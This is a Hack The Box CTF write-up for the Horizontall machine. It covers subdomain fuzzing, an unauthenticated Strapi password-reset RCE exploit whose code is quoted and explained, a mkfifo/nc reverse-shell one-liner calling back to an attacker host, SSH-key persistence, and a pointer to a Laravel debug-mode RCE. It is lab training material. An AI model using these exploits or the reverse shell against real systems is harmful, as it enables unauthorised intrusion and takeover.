---
title: Horizontall
date: 2021-12-28 11:11:11 +/-TTTT
categories: [CTF, hackthebox]
tags: [dns, ]
---

|Machine Name | Date | Level | Type |
|-------------|-------|------|------|
| Horizontall | 2021-12-28 | Easy | ctf |

![infocard](/assets/htb/horizontall/newinfocard.png)


## Reconnaissance

As always start with the Nmap.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-12 13:59 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds

```

here we get the HTTP server and ssh service.


### HTTP

Let's Enumerate the HTTP first.

When we browse the IP address into a browser it redirects us to `http://horizontall.htb`. Add it to `/etc/hosts` file.

`index.html` serves a static image.

![index](/assets/htb/horizontall/indexpage.png)

Review source code but nothing interested found.

Lets try to fuzz for subdomains.


`ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://horizontall.htb -H "Host:FUZZ.horizontall.htb" -fc 301`

we can find one subdomain : `api-prod`

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 301
________________________________________________

api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]


```

when we go-to `http://api-prod.horizontall.htb` webpage only display Welcome text.

![welcome](/assets/htb/horizontall/welcome.png)

Let's do directory fuzzing on subdomain.

`ffuf -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt`

we get

/admin
/index.html
/reviews
/robots.txt
/users

`robots.txt` is empty.

```
# To prevent search engines from seeing the site altogether, uncomment the next two lines:
# User-Agent: *
# Disallow: /

```

`/admin` looks interesting. Lets check it out.

on the `/admin` page we get `strapi` login page.

![admin](/assets/htb/horizontall/adminpage.png)

`strapi` is node.js , opensource api.

A quick search of searchsploit and we got rce.

![searchsploit.png](/assets/htb/horizontall/searchsploit.png)

Let analyse the exploit first.

```python3
if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()

```

First It will check if user provide any input (in this case a url) and if url is ended with `/` it will strip it.

next it will run the `check_version()` function.

```
def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")

```

check version function try to find out version of `strapi`.
this function send the request to `http://api-prod.horizontall.htb/admin/init`. lets fetch `strapi` version manually.

`curl http://api-prod.horizontall.htb/admin/init`

![versioncms](/assets/htb/horizontall/versioncms.png)

As we can see we got version `3.0.0-beta.17.4` which is vulnerable to Unauthenticated Remote Code Execution.

Next exploit run the function `password_reset()`

```
global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
```

This function is used to reset password for user.

It is send request to the `http://api-prod.horizontall.htb/admin/auth/reset-password` with the `params` data. and save output in `output` variable.

after successful execute of exploit it will run the `Terminal()` function. which is just serve us blind shell.


## Gaining Access

Now we understand how exploit works lets try it out.

![exploit](/assets/htb/horizontall/exploit.png)

We get reverse shell using 

```
mkfifo /tmp/lol;nc attacker_ip 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol

```

![reveshell](/assets/htb/horizontall/strapishell.png)

Add our ssh public key in `/opt/strapi/.ssh/authorized_keys`
and ssh into box.


## Privilege Escalation

### strapi to root.

run the `linpeas.sh` and we found out port 1337 and 8000 are listen locally.

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN  

```

We can forward the port and analyse it from our machine.

` ssh strapi@$ip -L 8000:127.0.0.1:8000 `

browse the `http://127.0.0.1:8000/`. We got the default laravel page.

![img](/assets/htb/horizontall/laravel.png)

Here we can also see the version : `Laravel v8 (PHP v7.4.18)`.

Lets quick search for exploit and we got `Laravel 8.4.2 debug mode - Remote code execution `. This exploit target the improper input validation and attacker can get rce using this exploit.

![img](/assets/htb/horizontall/root.txt.png)

## Resources

